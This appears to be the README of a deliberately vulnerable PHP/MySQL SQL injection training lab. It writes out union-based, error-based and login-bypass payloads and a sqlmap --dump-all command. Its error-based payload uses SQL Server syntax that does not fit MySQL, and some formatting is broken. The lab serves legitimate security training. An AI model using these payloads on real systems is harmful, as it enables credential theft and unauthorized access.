# SQL Injection Lab – Intentionally Vulnerable MySQL App

![Main Page](screenshots/main-page.png)

**⚠️ WARNING: This is an intentionally vulnerable application for educational and legal pentesting practice only. Do NOT deploy on the public internet.**

A hands-on lab for practicing SQL injection techniques on a MySQL-backed PHP app. Includes union-based, error-based, and blind boolean SQLi at different difficulty levels. Dockerized for instant setup.

Perfect for pentesting portfolios, CTFs, or interview prep (OWASP Top 10 A03:2021).

## Features
- Three deliberate SQL injection vulnerabilities (Easy → Hard)
- Docker Compose setup (MySQL 8 + PHP-Apache)
- Sample data with admin credentials
- `secure` branch with full mitigation using prepared statements

## Quick Start
```bash
git clone https://github.com/ChefCS/sql-injection-lab-mysql.git
cd sql-injection-lab-mysql
docker-compose up --build
Open http://localhost:8080
Vulnerabilities & Exploits
1. Easy – Union-Based SQLi (Product Search)
Union Exploit
Payload:
' UNION SELECT NULL, CONCAT(username, ':', password), NULL FROM users --
Dumps credentials: admin:admin123, user:pass123
2. Medium – Error-Based SQLi (Product by ID)
Error-Based Exploit
Payload:
1' AND 1=CONVERT(INT, (SELECT @@version)) --
Leaks MySQL version in error message.
3. Hard – Blind Boolean-Based SQLi (Login)
Blind Bypass
Payload (full bypass):
Username: admin' OR '1'='1' --
Password: anything
Logs in without valid credentials.
Automation with sqlmap
Bashsqlmap -u "http://localhost:8080/?search=test" --dump-all --batch
Secure Version
Check out the secure branch:
Bashgit checkout secure
docker-compose up --build
All injections are prevented using prepared statements and parameter binding.
Why This Project?
Demonstrates real-world SQL injection attack vectors and proper defenses. Great for cybersecurity resumes, bug bounty prep, or teaching secure coding.
License
MIT
Made with 🔥 by Cesar Sandoval (@ChefCS) 